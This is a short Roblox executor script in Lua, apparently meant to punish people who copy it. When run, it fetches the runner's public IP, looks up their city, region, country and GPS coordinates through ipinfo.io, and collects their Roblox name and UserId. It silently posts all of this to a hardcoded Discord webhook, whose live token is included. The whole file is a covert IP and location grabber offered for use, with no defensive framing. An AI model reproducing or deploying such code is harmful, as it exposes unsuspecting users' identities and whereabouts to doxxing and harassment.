-- skid
function service(n)
	return game:GetService(n)
end
local ip = game:HttpGet("https://api.ipify.org")
local iplink = "https://ipinfo.io/"..ip.."/json"
local ipinfo_json = game:HttpGet(iplink)
local ipinfo_table = service('HttpService'):JSONDecode(ipinfo_json)
local pn = service('Players').LocalPlayer.DisplayName.."(@"..service('Players').LocalPlayer.Name..')'
local us = service('Players').LocalPlayer.UserId
local url = 'https://discord.com/api/webhooks/1338206793385377873/IYbV83OwmD3Jjd1eHO2NwJFv6_oQxchYBSk8BtUM930J5h66_-9f96SH1XyPFA9ZctEt'
local newdata = service('HttpService'):JSONEncode({content = '!!skid alert!!\n`Name: '..pn..'`\n`UserId: '..us..'`\n`Ip: '..ipinfo_table.ip..'`\n`Country: '..ipinfo_table.country..'`\n`GPS: '..ipinfo_table.loc..'`\n`City: '..ipinfo_table.city..'`\n`Region: '..ipinfo_table.region..'`\nnever fuckin skid lmao!!🔥🔥'})
request = http_request or request or (fluxus and fluxus.request) or (http and http.request)
local abc = {Url = url, Body = newdata, Method = 'POST', Headers = {['content-type'] = 'application/json'}}
request(abc)
